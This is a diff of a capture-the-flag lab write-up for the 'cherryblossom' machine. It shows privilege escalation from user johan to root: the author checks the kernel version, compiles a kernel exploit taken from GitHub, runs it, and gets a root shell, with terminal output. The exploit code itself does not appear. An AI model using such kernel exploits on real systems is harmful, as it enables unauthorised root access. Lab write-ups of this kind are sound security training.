@@ -412,9 +412,34 @@ johan@cherryblossom:~$
 ```
 bull's eye we are in as user `johan`
 
-![image](https://user-images.githubusercontent.com/87468669/221492695-81cc34fa-8225-49a9-9404-995ef0904edc.png)
+```
+johan@cherryblossom:~$ uname -a
+Linux cherryblossom 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+johan@cherryblossom:~$ 
+```
+checking the version of the os, we can see it is running an outdated version of ubuntu. let's try out kernel exploit.
 
-running linpeas.sh, we got to see the sudo version of this target is vuln to overlayfs.
+![image](https://user-images.githubusercontent.com/87468669/221529331-b55aaedb-d3fe-4ff2-b959-730182eae0a9.png)
+
+found an exploit on github. download and comopile the exploit using `make` 
+
+```
+johan@cherryblossom:~$ chmod +x exploit 
+johan@cherryblossom:~$ ./exploit 
+[sudo] password for johan: 
+Sorry, try again.
+# id 
+uid=0(root) gid=0(root) groups=0(root),1001(johan),1003(devs)
+# whoami 
+root
+# 
+```
+send the exploit to the target and run it. it gave us a root shell
+
+![image](https://user-images.githubusercontent.com/87468669/221529998-154360c6-f0e3-4494-ac1e-7caa730f70f5.png)
+
+and we are through.
+
 
 
 
